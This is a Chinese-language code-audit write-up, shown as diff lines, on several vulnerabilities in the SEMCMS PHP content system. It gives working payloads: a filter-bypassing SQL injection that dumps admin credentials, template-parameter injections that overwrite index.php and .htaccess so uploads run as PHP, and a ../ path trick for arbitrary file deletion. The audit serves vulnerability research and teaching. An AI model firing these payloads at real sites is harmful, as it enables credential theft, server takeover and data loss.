@@ -1,0 +1,236 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="8408ff95dcb6d1bfaa0ccc57e795a4fe">PHP代码审计-某CMS漏洞合集</h1>
+<h2 data-content="1" id="31370bfcc6496310ee3b7e3ed7d87aee">0x00 前言</h2>
+<p>  因为与这个CMS挺有缘份的，故花了点时间看了下代码，发现这个CMS非常适合入门代码审计的人去学习，因为代码简单且漏洞成因经典，对一些新手有学习价值，故作了此次分享。</p>
+<h2 data-content="1" id="9b21360359fd60c048ee3f9d0fdf37b2">0x01 前台注入</h2>
+<p>从入口开始:<code>/semcms/Templete/default/Include/index.php</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122801-ed7f988a-c386-1.png"/></p>
+<p>跟进<code>web_inc.php</code>,首先包含</p>
+<p>1)<code>db_conn.php</code>:建立与数据库的连接,代码量很少也很简单。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122825-fbb7eaf6-c386-1.png"/></p>
+<p>2)<code>contorl.php</code>:对<code>$_GET</code>进行全局过滤危险的SQL函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122837-02c20a48-c387-1.png"/></p>
+<p>这个过滤从最简单的角度来说，即mysql&lt;8的情况下，把<code>select</code>禁用了，其实就没办法进行跨表查询，SQL利用造成危害的可能性会大大降低，当然这是一种直接且无需考虑用户体验为原则的暴力做法，点到为止吧。</p>
+<p>回到<code>web_inc.php</code>,继续阅读，后面吸引我的地方，在于 89 line一处<code>SQL</code>语句的地方。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122848-095b3564-c387-1.png"/></p>
+<p>可以看到<code>$Language</code>没有单引号，直接拼接到语句中，且值由POST方式传递，不过这里经过了<code>verify_str</code>函数，导致我没有办法利用<code>select</code>进行子查询，获取到<code>sc_user</code>表的后台管理员用户密码，那么事实真的如此么？</p>
+<div class="highlight"><pre><span></span><span class="x">$Language=test_input(verify_str($_POST["languageID"]));</span>
+</pre></div>
+<p>经过<code>verify_str</code>函数处理后，会传入<code>test_input</code>函数，其返回值将会拼接进SQL语句中进行查询。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122859-0f94821e-c387-1.png"/></p>
+<p><code>test_input</code>里面有个有趣的函数<code>stripslashes</code>,函数的作用就是用于去除反斜杠，举个如图例子</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122909-15e1f6a6-c387-1.png"/></p>
+<p>那么绕过<code>verify_str</code>思路就水到渠成了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122920-1c10bce2-c387-1.png"/></p>
+<p><strong>分析下payload的原理</strong></p>
+<div class="highlight"><pre><span></span><span class="x">languageID=-1 uni\on sel\ect 1,concat(user_admin,0x2d,user_ps),3,4,5,6,7,8,9,10,11,12,13,14 from sc_user</span>
+</pre></div>
+<p><code>un\ion</code>&amp;&amp;<code>sel\ect</code>绕过了<code>verify_str</code>函数的正则匹配，经过<code>test_input</code>的<code>stripslashes</code>去掉反斜杠，最终拼接到数据库中执行的语句，实际上</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122931-22d8aa94-c387-1.png"/></p>
+<p>返回的后台管理员的账号密码信息到<code>$tag_indexmetatit</code>变量中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122940-28740bec-c387-1.png"/></p>
+<p>并经过<code>if</code>判断传递给<code>$indextitle</code>变量，最终直接被<code>echo</code>到返回包。</p>
+<div class="highlight"><pre><span></span><span class="x">if (empty($tag_indexmetatit)){$indextitle=$tag_indexkey;}else{$indextitle=$tag_indexmetatit;}</span>
+<span class="x">      if (empty($tag_prometatit)){$protitle=$tag_prokey;}else{$protitle=$tag_prometatit;}</span>
+<span class="x">      if (empty($tag_newmetatit)){$newstitle=$tag_newkey;}else{$newstitle=$tag_newmetatit;}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424122950-2dfe368c-c387-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123010-39eeda8c-c387-1.png"/></p>
+<h3 data-content="1" id="16423cb70a5e9149705705aaf2b490b3">0x1.1 小结</h3>
+<p>  由于<code>web_inc.php</code>是所有前台文件都会包含的，所以说这个注入点在任意前台文件中都可以无条件触发，唯一的区别就是其他文件可能没有回显的地方。当然，同样地基于此绕过原理，还可以找到很多处类似的注入或者其他更为简单且直接的注入点,这些就留给读者们自己探索。</p>
+<h2 data-content="1" id="574530d575ff611d043a6070c469d08e">0x02 寻找后台</h2>
+<p>  虽然在0x01中挖掘到了前台无限制回显的SQL注入漏洞,但因为查询数据库用的是<code>mysqli</code>的<code>query</code>函数而不是<code>multi_query</code>函数,故注入点并不支持堆叠注入，这直接导致我们少了一条SQLGetSHell的道路。值得开心一点的是，我们目前可以通过注入点获取到管理员的账号密码，不过这个CMS的后台地址安装时是随机生成的，所以找到后台地址很困难，下面是自己尝试寻找后台的失败过程，很可惜没有突破。</p>
+<h3 data-content="1" id="7ffa4667033aa84c458c7da4f8a74784">0x2.1 失败的过程</h3>
+<p><code>semcms/install/index.php</code>安装文件有后台地址的生成代码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123025-42d01508-c387-1.png"/></p>
+<p>那么我的思路，就是全局定位<code>$ht_filename</code>变量，看看有没有对此进行操作并存储的代码。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123037-49f24d88-c387-1.png"/></p>
+<p>很遗憾，并没有找到对此变量引用的代码。还没到放弃的时候，一般这个时候，我还会额外找找一些其他的办法。</p>
+<p>比如搜索<a href="https://www.php.net/manual/zh/function.scandir.php" target="_blank">scandir函数</a>，该函数作用是列出指定路径中的文件和目录，目的是通过找到类似目录遍历漏洞的点，从而找到后台地址。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123046-4f98241a-c387-1.png"/></p>
+<p>继续回溯<code>TemplateDir</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123057-563438c2-c387-1.png"/></p>
+<p>可惜的是，发现传入的第一个参数是固定的，故这个思路也断了，暂时没有想到其他的好办法了。</p>
+<h2 data-content="1" id="efc4fdeaaa105f9ac5bd6fb239dfbfa1">0x03 GetShell思路</h2>
+<p>  目标CMS的代码量并不高，故寻找GetShell的思路，可以采用危险函数定位的方法来进行快速排除并在存在漏洞的可疑的地方再进行回溯分析。</p>
+<h3 data-content="1" id="42a3ed14aae7b0efd33265e68e694e85">0x3.1 定位思路</h3>
+<p>文件包含函数:<a href="https://www.php.net/manual/zh/language.control-structures.php" target="_blank">流程控制</a></p>
+<ul>
+<li>
+<p><a href="https://www.php.net/manual/zh/function.require.php" target="_blank">require</a></p>
+</li>
+<li>
+<p><a href="https://www.php.net/manual/zh/function.include.php" target="_blank">include</a></p>
+</li>
+<li>
+<p><a href="https://www.php.net/manual/zh/function.require-once.php" target="_blank">require_once</a></p>
+</li>
+<li>
+<p><a href="https://www.php.net/manual/zh/function.include-once.php" target="_blank">include_once</a></p>
+</li>
+</ul>
+<hr/>
+<p>文件操作函数: <a href="https://www.php.net/manual/zh/ref.filesystem.php" target="_blank">文件系统函数</a></p>
+<ul>
+<li>
+<a href="https://www.php.net/manual/zh/function.copy.php" target="_blank">copy</a> — 拷贝文件</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.delete.php" target="_blank">delete</a> — 参见 unlink 或 unset</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fflush.php" target="_blank">fflush</a> — 将缓冲内容输出到文件</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.file-get-contents.php" target="_blank">file_get_contents</a> — 将整个文件读入一个字符串</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank">file_put_contents</a> — 将一个字符串写入文件</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fputcsv.php" target="_blank">fputcsv</a> — 将行格式化为 CSV 并写入文件指针</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fputs.php" target="_blank">fputs</a> — fwrite 的别名</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fread.php" target="_blank">fread</a> — 读取文件（可安全用于二进制文件）</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fscanf.php" target="_blank">fscanf</a> — 从文件中格式化输入</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.fwrite.php" target="_blank">fwrite</a> — 写入文件（可安全用于二进制文件）</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.move-uploaded-file.php" target="_blank">move_uploaded_file</a> — 将上传的文件移动到新位置</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.readfile.php" target="_blank">readfile</a> — 输出文件</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.rename.php" target="_blank">rename</a> — 重命名一个文件或目录</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank">rmdir</a> — 删除目录</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank">unlink</a> — 删除文件</li>
+</ul>
+<hr/>
+<p>代码注入函数:</p>
+<ul>
+<li>
+<a href="https://www.php.net/manual/zh/function.eval.php" target="_blank">eval</a> — 把字符串作为PHP代码执行</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.assert.php" target="_blank">assert</a> — 检查一个断言是否为 false</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank">preg_replace</a> — 执行一个正则表达式的搜索和替换</li>
+</ul>
+<hr/>
+<p>命令执行函数:<a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank">程序执行函数</a></p>
+<ul>
+<li>
+<a href="https://www.php.net/manual/zh/function.escapeshellarg.php" target="_blank">escapeshellarg</a> — 把字符串转码为可以在 shell 命令里使用的参数</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank">escapeshellcmd</a> — shell 元字符转义</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.exec.php" target="_blank">exec</a> — 执行一个外部程序</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.passthru.php" target="_blank">passthru</a> — 执行外部程序并且显示原始输出</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.proc-close.php" target="_blank">proc_close</a> — 关闭由 proc_open 打开的进程并且返回进程退出码</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.proc-get-status.php" target="_blank">proc_get_status</a> — 获取由 proc_open 函数打开的进程的信息</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.proc-nice.php" target="_blank">proc_nice</a> — 修改当前进程的优先级</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.proc-open.php" target="_blank">proc_open</a> — 执行一个命令，并且打开用来输入/输出的文件指针。</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.proc-terminate.php" target="_blank">proc_terminate</a> — 杀除由 proc_open 打开的进程</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank">shell_exec</a> — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.system.php" target="_blank">system</a> — 执行外部程序，并且显示输出</li>
+</ul>
+<hr/>
+<p>变量覆盖:</p>
+<ul>
+<li>
+<a href="https://www.php.net/manual/zh/function.extract.php" target="_blank">extract</a> — 从数组中将变量导入到当前的符号表</li>
+<li>
+<a href="https://www.php.net/manual/zh/function.parse-str.php" target="_blank">parse_str</a> — 将字符串解析成多个变量</li>
+</ul>
+<h3 data-content="1" id="1fd1716f0d954edddb0ac15cd3b91df2">0x3.1 后台GetShell</h3>
+<p>搜索<code>file_put_contents</code>函数，只有两个结果，一个是参数写死，故放弃，故只剩这个分析。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123132-6ac948f4-c387-1.png"/></p>
+<p>写入的文件<code>$templateUrl</code>得到的值是固定两种类型。</p>
+<div class="highlight"><pre><span></span><span class="x">../index.php  根目录</span>
+<span class="x">../.htaccess  根目录</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="x">function Mbapp($mb,$lujin,$mblujin,$dirpaths,$htmlopen){</span>
+
+
+<span class="x">       if ($htmlopen==1){$ml="j";}else{$ml="d";}</span>
+
+<span class="x">        $template="index.php,hta/".$ml."/.htaccess"; //开始应用模版</span>
+<span class="x"> //  1.$template=index.php,hta/j/.htaccess</span>
+<span class="x"> //  2.$template=index.php,hta/d/.htaccess</span>
+<span class="x">        $template_mb=explode(",",$template);</span>
+<span class="x">  //$template_mb 根据,分割为index.php和hta/d/.htaccess的数组</span>
+
+<span class="x">        for($i=0;$i&lt;count($template_mb);$i++){</span>
+<span class="x">                            // 获取路径的内容</span>
+<span class="x">              $template_o = file_get_contents($mblujin.'Templete/'.$mb.'/Include/'.$template_mb[$i]);</span>
+<span class="x">             // ../拼接$template_mb[$i]中的"hta/".$ml."/"字符串替换为空的结果</span>
+<span class="x">             // 即得到../.htacess 或者 ../.index.php</span>
+<span class="x">              $templateUrl = $lujin.str_replace("hta/".$ml."/","", $template_mb[$i]);</span>
+<span class="x">              // 修改$template_o的'&lt;{Template}&gt;'标记为$mb的值</span>
+<span class="x">              $output = str_replace('&lt;{Template}&gt;', $mb, $template_o);</span>
+<span class="x">              $output = str_replace('&lt;{dirpaths}&gt;', $dirpaths, $output);</span>
+<span class="x">          // 将替换的内容写入到$templateUrl指向的文件</span>
+<span class="x">          file_put_contents($templateUrl, $output);</span>
+
+<span class="x">           }</span>
+
+<span class="x">}</span>
+</pre></div>
+<p>那么这个函数如果<code>$mb</code>可控的话，会发生什么问题？</p>
+<p><strong>问题一</strong></p>
+<p>能够修改<code>semcms/Templete/default/Include/index.php</code>中的<code>&lt;{Template}&gt;</code>的内容</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123141-709eb6a6-c387-1.png"/></p>
+<p>那么可以尝试如下的形式构造payload:</p>
+<div class="highlight"><pre><span></span><span class="x">/semcms/N8D3ch_Admin/SEMCMS_Template.php?CF=template&amp;mb=default/'.phpinfo():.'/..</span>
+</pre></div>
+<p>最终的话会在<code>semcms/Templete/default/Include/index.php</code>写入如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123150-7596e4d0-c387-1.png"/></p>
+<p><strong>问题2</strong></p>
+<p>能够修改根目录<code>.htacess</code>的内容</p>
+<p><a href="https://www.anquanke.com/post/id/241147#h3-5" target="_blank">与 .htaccess 相关的奇淫技巧 </a></p>
+<blockquote>
+<p>SetHandler application/x-httpd-php</p>
+<p>此时当前目录及其子目录下所有文件都会被当做 php 解析。</p>
+</blockquote>
+<p>那么可以尝试如下的形式构造payload:</p>
+<div class="highlight"><pre><span></span><span class="x">/semcms/N8D3ch_Admin/SEMCMS_Template.php?CF=template&amp;mb=default/%0aSetHandler%20application/x-httpd-php%0a%23/../..</span>
+
+<span class="x">//这里因为application/x-httpd-php中带有/，所以多需要一个../进行跳转</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123202-7ce0d192-c387-1.png"/></p>
+<p>最终写入的内容:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123211-81f69e6e-c387-1.png"/></p>
+<p>那么我们随意上传一个文件，即可当作PHP来解析。</p>
+<p>那么<code>$mb</code>到底是否可控呢？ 回溯<code>Mbapp</code>函数的上层调用，可以发现可以通过<code>$_GET['mb']</code>来控制。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123220-8763fff4-c387-1.png"/></p>
+<p>不过因为文件引进<code>/semcms/Include/contorl.php</code>，会调用<code>verify_str</code>对<code>$_GET</code>变量进行过滤。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123230-8dae1c14-c387-1.png"/></p>
+<p>很不凑巧，过滤了单引号，导致我们<strong>问题1</strong>覆盖的<code>index.php</code>的思路直接断了，因为根本没办法逃逸出单引号。</p>
+<p>不过问题2的话，倒是可以成功，因为传入的内容并不在<code>inject_check_sql</code>的黑名单中，可以成功地覆盖<code>.htaccess</code>文件，不过这种方式也是有局限性的，需要Apahce是通过module的形式加载PHP的文件来执行才可以，并且需要在Linux环境，因为window不支持跨越不存在的路径。</p>
+<h2 data-content="1" id="6295a278d6af31d5a3a555bbd64d9d0b">0x04 任意文件删除</h2>
+<p>  最后还想额外提一下关于后台的漏洞，便是其中一个任意文件删除漏洞，这个删除点不是直接的点，而是先通过构造需要删除的文件路径存进数据库，再通过触发其他点进行获取，传入<code>unlink</code>中进行删除，这种类型笔者称之为二次任意文件删除漏洞，很是经典。</p>
+<p><strong>漏洞演示:</strong></p>
+<p>1)传入<code>../rmme.txt</code>作为图片的路径</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123300-9f6c3576-c387-1.png"/></p>
+<p>2)选择删除图片后，会删除文件网站根目录下的<code>rmme.txt</code>文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123251-99f4c112-c387-1.png"/></p>
+<p><strong>成因:</strong></p>
+<p>(1) 添加URL入库的时候，只是做了<code>test_input</code>，并没有过滤<code>..</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123308-a47b6924-c387-1.png"/></p>
+<p>(2) 直接入库</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123317-a9a86bea-c387-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123326-aeeb1ca6-c387-1.png"/></p>
+<p>(3) 删除图片的时候，传入<code>AID</code>，获取到<code>images_url</code>字段的值<code>../rmme.txt</code>传入<code>Delfile</code>函数进行删除。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123334-b39f60fe-c387-1.png"/></p>
+<p><code>Delfile</code>函数先判断文件是否存在，再使用<code>unlink</code>删掉文件，全程没有一丁点的过滤，送分题!</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220424123342-b85daede-c387-1.png"/></p>
+<h2 data-content="1" id="7669b5b1e7dd2228641be8241bf11ae3">0x05 总结</h2>
+<p>  本文直接从一个入口的注入点展开，想找到一条合适的链路到GetShell的完整过程，但是遗憾的是，没能解决6位随机后台地址的问题，故实际利用起来的话，局限性还是有的，姑且称之为一次分享式的尝试性代码审计体验录吧。</p>
+</div>
+</div>
